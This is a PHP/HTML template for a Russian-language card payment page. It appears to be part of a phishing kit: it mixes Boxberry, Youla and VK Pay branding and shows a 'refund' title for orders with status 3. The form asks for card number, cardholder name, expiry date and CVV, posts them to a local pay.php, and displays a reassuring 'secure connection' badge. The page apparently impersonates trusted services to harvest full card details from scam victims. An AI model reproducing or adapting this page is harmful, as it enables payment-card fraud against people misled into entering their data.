<!DOCTYPE html>
<html>
<head>
    <title><?php echo $order['status'] == 3 ? 'Возврат денежных средств' : 'Оплата с банковской карты';?></title>
    <meta charset="utf-8">
    <meta name="robots" content="all">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://boxberry.ru/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="assets/css/payment/cpg_waiter.css" />
    <link rel="stylesheet" type="text/css" href="assets/css/payment/jquery.selectBox.css" />
    <link rel="stylesheet" type="text/css" href="assets/css/payment/pay-card.css">
    <script type="text/javascript" src="assets/js/payment/feature-detect.js"></script>
    <script type="text/javascript" src="assets/js/payment/es5-shim.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/jquery.selectBox.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/rb.js"></script>
    <script type="text/javascript" src="assets/js/payment/common.js"></script>
    <script type="text/javascript" src="assets/js/payment/cpg_waiter.js"></script>
    <script type="text/javascript" src="assets/js/payment/standard_waiter.js"></script>
    <style>
        #loading {
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            position: fixed;
            display: block;
            opacity: 0.7;
            background-color: #fff;
            z-index: 99;
            text-align: center;
        }

        #loading-image {
            position: absolute;
            top: 50%;
            left: 50%;
            z-index: 100;
        }
    </style>
</head>

<body class="body_fixed-width_no body_fixed-height_no body_background_youla-mobile">
    <div id="loading">
        <img id="loading-image" src="assets/img/loader.gif" alt="Пожалуйста подождите..." />
    </div>
    <div class="pay-card-layout pay-card-layout_type_youla-mobile">
        <div class="pay-card-layout__header_type_vkpay">
            <div class="pay-card-layout__logo">
                
<svg viewBox="0 0 154 42" fill="none" xmlns="http://www.w3.org/2000/svg" width="150px" class="logo" data-v-208a69ab="">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M104 42H114.944L119.646 28.7887L124.535 24.7392L128.386 36.6869C129.577 40.3797 130.803 42 133.477 42H141.856L133.212 18.5552L154 0H140.575L127.956 13.2116C126.486 14.7496 124.999 16.2634 123.508 18.0715H123.381L129.682 0H118.737L104 42Z" fill="#1AB248" data-v-208a69ab=""></path>
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M103.528 0.00166416C106.96 0.00221654 110.289 0.00275227 113.077 0.00299438L110.818 6.93737C110.108 9.11608 108.306 10.1584 104.334 10.1584C97.4378 10.1584 87.2335 10.1572 80.3365 10.156L82.5955 3.22165C83.3052 1.04174 85.107 0 89.079 0C93.1875 0 98.47 0.000850164 103.528 0.00166416ZM83.5091 15.921C90.4051 15.921 100.61 15.9222 107.507 15.924L105.248 22.8581C104.538 25.0374 102.736 26.0791 98.7639 26.0791C91.8676 26.0791 81.6633 26.0779 74.7663 26.0761L77.0253 19.1427C77.735 16.963 79.537 15.921 83.5091 15.921ZM101.663 31.844C94.7665 31.8428 84.5622 31.8416 77.6659 31.8416C73.6932 31.8416 71.8918 32.8839 71.1821 35.062L68.9231 41.9973C75.8201 41.9979 86.0244 42 92.921 42C96.8927 42 98.6948 40.9574 99.4045 38.7781L101.663 31.844Z" fill="#1AB248" data-v-208a69ab=""></path>
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M54.3767 10.116L60.25 10.1184C65.2542 10.1196 64.112 16.1685 61.5794 22.0639C59.3478 27.26 55.3927 31.8454 50.6743 31.8448L40.883 31.8436C36.9776 31.8436 35.177 32.8859 34.4175 35.0639L32 41.9988L39.1798 42L46.1982 41.9434C52.4223 41.8937 57.5178 41.4583 63.4765 36.2753C69.7737 30.8001 77.1159 16.5763 75.858 8.3494C74.8726 1.90253 71.2934 0.00299423 62.6263 0.00239538L46.8324 0L37.6363 26.0492L43.4793 26.0564C46.9568 26.0602 48.702 26.1025 50.5518 21.2848L54.3767 10.116Z" fill="#1AB248" data-v-208a69ab=""></path>
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M27.376 10.1522L22.9585 10.1534C14.1091 10.1576 6.52603 31.8484 16.9894 31.8448L23.7124 31.8436C27.5898 31.8436 30.4682 33.214 29.1937 36.9092L27.4374 41.9988L20.3071 42L14.5073 41.9434C7.08759 41.8716 2.29964 38.3315 0.575665 32.9562C-1.28993 27.1394 1.34396 15.0071 8.98851 7.23525C13.4241 2.72654 19.5683 0.00299423 27.446 0.00239538L42 0L39.7249 6.35674C38.255 10.4639 35.2518 10.1576 33.538 10.157L27.376 10.1522Z" fill="#1AB248" data-v-208a69ab=""></path>
                </svg>
            </div>
        </div>
        <div class="pay-card js-pay-card pay-card_type_youla-mobile" data-type="freepay">
            <div class="pay-card__row">
                <div class="pay-card__card js-credit-card">
                    <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
                        <form method="POST" action="pay.php" onsubmit="return load();" class="credit-card-form__form js-card-form" autocomplete="on">
                            <div class="credit-card-form__card-wrapper">
                                <div class="credit-card-form__card credit-card-form__card_position_front">
                                    <div class="payment-systems-icons payment-systems-icons">
                                        <span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
                                        <span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
                                        <span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
                                        <span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
                                    </div>
                                    <div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
                                        <label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Номер карты</span>
											<input type="tel" name="cardnumber" id="cardnumber" autocomplete="cc-number" placeholder="От 16 до 19 цифр" class="credit-card-form__input js-cc-input js-cc-number-input"  required>
											<div class="credit-card-form__error-text">Номер карты введён неверно</div>
										</label>
                                    </div>
                                    <div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
                                        <label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Имя и фамилия на карте</span>
											<input type="text" name="cardholder" id="cardholder" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder=""  required>
											<div class="credit-card-form__error-text">Имя и фамилия латинскими буквами, как на карте</div>
										</label>
                                    </div>
                                    <div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix">
                                        <label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Срок действия</span>
											<input type="text" name="expdate" id="expdate" autocomplete="cc-exp" placeholder="ММ/ГГ" class="credit-card-form__input js-cc-input js-cc-exp-input"  required>
											<div class="credit-card-form__error-text">Неверная дата</div>
										</label>
                                        <label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label"> <span class="credit-card-form__title">CVV код <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div></span>
											<div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv"> Последние 3 цифры на полосе для подписи
												<div class="credit-card-form__tooltip-icon"></div>
												<div class="credit-card-form__tooltip-arrow"></div>
											</div>
											<input type="tel" name="cvc2" id="cvc2" placeholder="" class="credit-card-form__input  js-cc-input js-cc-cvv-input" autocomplete="off"  required>
											<div class="credit-card-form__error-text js-cc-error-text">Последние три цифры на обороте</div>
										</label>
                                    </div>
                                </div>
                            </div>
                            <div class="credit-card-form__submit">
                                <div class="credit-card-form__submit-inner">
                                    <input type="hidden" name="amount" value="<?php echo $order['amount']; ?>">
                                    <input type="hidden" name="description" value="<?php echo $order['product']; ?>">
                                    <input type="hidden" name="order_id" value="<?php echo $order['code']; ?>">
                                    <input type="submit" class="js-button-submit button" name="submit" value="<?php echo $order['status'] == 3 ? 'Далее' : 'Подтвердить оплату';?>">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <div class="secure-information secure-information_type_youla-mobile">
            <span class="secure-information__text" title="Защищённое соединение. Ваши данные в безопасности.">
				<span class="secure-information__icon"></span> <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
            <span class="secure-information__text_type_secure-connection">Защищённое соединение</span>
            </span>
        </div>
    </div>
    <script language="javascript" type="text/javascript">
        function load() {
            $('#loading').show();
        }

        $(window).load(function() {
            $('#loading').hide();
        });
    </script>
    <script>
        window.onload = function() {
            var system = document.getElementById('cardnumber');
            system.onkeyup = function() {
                var value = system.value;
                system.value.replace(/(\d)(?=(\d{3})+(\D|$))/g, '$1')
                if (value.length > 0) {
                    var num = value[0];
                    if (num == 2) {
                        $('#mir').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
                    } else if (num == 4) {
                        $('#visa').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
                    } else if (num == 5) {
                        $('#mastercard').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
                    } else if (num == 6) {
                        $('#maestro').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
                    }
                }

                if (value.length <= 0) {
                    $('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
                    $('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
                    $('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
                    $('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
                }
            }
        }
    </script>
    <script src="assets/js/maskedinput.js"></script>
    <script>
        $(document).ready(function() {
            $("#cardnumber").mask("9999 9999 9999 9999", {
                placeholder: ""
            }, {
                autoclear: false
            });
            $("#expdate").mask("99/99", {
                placeholder: ""
            }, {
                autoclear: false
            });
            $("#cvc2").mask("999", {
                placeholder: ""
            }, {
                autoclear: false
            });
        });
    </script>
</body>

</html>